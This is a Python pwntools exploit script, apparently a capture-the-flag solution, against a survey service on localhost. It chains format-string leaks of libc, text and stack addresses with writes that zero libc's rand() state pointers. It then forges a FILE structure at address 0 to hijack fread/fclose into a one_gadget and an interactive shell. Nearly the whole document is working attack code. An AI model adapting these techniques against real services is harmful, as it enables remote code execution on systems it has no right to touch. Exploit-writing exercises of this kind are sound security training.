#!/usr/bin/env python3
from pwn import *

context.clear(arch='amd64')

def uid(p, u):
    p.sendlineafter(b'ID: ', str(u))

def do_survey(p, survey):
    p.sendafter(b'Content: ', survey[:3], 0.2)
    p.sendafter(b'Moderation: ', survey[3:6], 0.2)
    p.sendafter(b'Interface: ', survey[6:9], 0.2)
    return p.sendafter(b'Support: ', survey[9:12], 0.2)

def firstlogin(p, name):
    p.sendlineafter(b'name?', name)

def logout(p):
    p.sendlineafter(b'> ', '4')

def delete(p):
    p.sendlineafter(b'> ', '3')

def makefriends(p, friends):
    p.sendlineafter(b'> ', '1')
    p.sendlineafter(b'make? ', str(friends))

libc = ELF('./libc.so.6')

# Clear user 0
p1 = remote('localhost', 1337)

uid(p1, 0)
if do_survey(p1, b'10\n10\n10\n10\n') == b'Support: ':
    delete(p1)
    p1.recvuntil(b'Deleting')
    sleep(0.2)
    p1.close()

# Clear user 1
p1 = remote('localhost', 1337)

uid(p1, 1)
if do_survey(p1, b'10\n10\n10\n10\n') == b'Support: ':
    delete(p1)
    p1.recvuntil(b'Deleting')
    sleep(0.2)
    p1.close()

# Create user 0
p1 = remote('localhost', 1337)

uid(p1, 0)
firstlogin(p1, b'ljp')
logout(p1)
p1.recvuntil(b'Logging')
sleep(0.2)
p1.close()

# Leak libc, text, stack
p1 = remote('localhost', 1337)

libc_offset = 0x3c56a3
text_offset = 0x11b0

uid(p1, 0)
do_survey(p1, b'|%p|%14$p|%p')
p1.recvuntil(b'|')

libc.address = int(p1.recvuntil(b'|', drop=True), 16) - libc_offset
log.info('libc address : {:#x}'.format(libc.address))

text = int(p1.recvuntil(b'|', drop=True), 16) - text_offset
log.info('text address : {:#x}'.format(text))

do_survey(p1, b'10\n10\n10\n10\n')

logout(p1)

uid(p1, 0)
do_survey(p1, b'|%16$p|aaaaaa')
p1.recvuntil(b'|')

stack = int(p1.recvuntil(b'|', drop=True), 16)
log.info('stack address : {:#x}'.format(stack))

do_survey(p1, b'10\n10\n10\n10\n')

logout(p1)

# edit *(unsafe_state->fptr) to 0 and
#      *(unsafe_state->rptr) to 0 
# to force rand() return 0
target1 = libc.address + 0x3c40b8
target2 = libc.address + 0x3c40c4

uid(p1, 0)
do_survey(p1, b'10\n10\n10\n10\n')
makefriends(p1, target1 // 8)
logout(p1)

uid(p1, 0)
do_survey(p1, b'00\n00\n00\n00\n')
do_survey(p1, b'00\n00\n00\n00\n')

makefriends(p1, (target2 - target1) // 8)
logout(p1)

uid(p1, 0)
do_survey(p1, b'00\n00\n00\n00\n')
do_survey(p1, b'00\n00\n00\n00\n')

logout(p1)

# now it will mmap file to va 0
# forge FILE struct
one_gadget = libc.address + 0xcd0f3
fileStr = FileStructure()
fileStr.flags = 0x8000
fileStr.vtable = 0
fileStr._IO_buf_end = p64(one_gadget)

log.info('one_gadget: {:#x}'.format(one_gadget))

uid(p1, 1)
payload = bytes(fileStr)
firstlogin(p1, payload)
logout(p1)

# access ok
uid(p1, 1)

# delete the file
p2 = remote('localhost', 1337)

uid(p2, 1)
do_survey(p2, b'10\n10\n10\n10\n')
delete(p2)
p2.recvuntil(b'Deleting')
sleep(0.2)
p2.close()

# back to p1, fopen will return NULL
# FILE *f points to forged FILE struct (va 0x0)
# hijack fread and fclose ;)
do_survey(p1, b'10\n10\n10\n10\n')

p1.interactive()

